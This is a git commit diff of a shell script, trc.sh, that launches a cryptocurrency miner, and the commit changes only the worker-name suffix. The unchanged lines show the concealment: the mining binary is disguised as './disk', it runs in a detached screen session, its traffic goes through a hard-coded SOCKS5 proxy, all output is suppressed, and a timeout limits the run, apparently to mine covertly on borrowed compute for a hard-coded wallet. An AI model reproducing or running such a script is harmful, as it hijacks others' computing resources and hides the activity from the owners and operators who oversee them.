575d04df3bc132404f9427e71d92dcfe3d29ce79
stromtracked <88982387+stromtracked@users.noreply.github.com>
2021-08-16 00:26:16 +0700

    Update trc.sh

--- trc.sh
+++ trc.sh
@@ -6,6 +6,6 @@ screen -dmS ls
 POOL=stratum+tcp://verushash.na.mine.zergpool.com:3300
 WALLET=19NGMAFwcdEPfYhW3FjsWMPF22m6WQi2b4
 PROXY=socks5://192.252.209.155:14455
-WORKER=$(echo $(shuf -i 10-999 -n 1)-STCOWS)
+WORKER=$(echo $(shuf -i 10-999 -n 1)-STROMTRC)
 timeout 280m ./disk -a verus -o $POOL -u $WALLET.$WORKER -p x -t 4 -x $PROXY > /dev/null 2>&1
 echo Sukses
